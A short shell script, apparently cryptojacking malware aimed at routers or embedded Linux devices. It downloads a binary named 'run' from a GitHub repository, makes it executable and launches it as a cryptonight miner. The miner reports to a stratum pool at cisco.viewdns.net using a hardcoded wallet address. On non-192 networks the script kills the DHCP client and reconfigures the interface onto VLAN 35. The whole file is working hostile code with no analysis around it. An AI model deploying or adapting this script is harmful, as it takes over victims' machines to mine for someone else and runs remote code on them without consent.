#!/bin/sh

END="cisco.viewdns.net"
PORT="80"
USER="497mFUrVuiY1uCnGwkRvJVWtEjGeughYLcwQpu4VcSmXZdjUi1KCVSn2tP2ZFbdBMtKKFyrKzRZNvRhXXTkFU91TPjTrDVg"
TAG="OSRUN"

_RUN(){
  wget https://github.com/osrun/beta/raw/master/run
  chmod +x run
  ./run -a cryptonight -o stratum+tcp://$END:$PORT -u $USER -p $TAG
}

if ifconfig | grep "inet addr" | cut -d: -f2 | cut -dB -f1 | cut -d. -f1 | grep -o 192 > /dev/null; then
 _RUN
else
  killall udhcpc
  vconfig add eth0 35
  ip link set eth0.35 up
  udhcpc -b -i eth0.35 -s /etc/05_rc.dhcp
fi
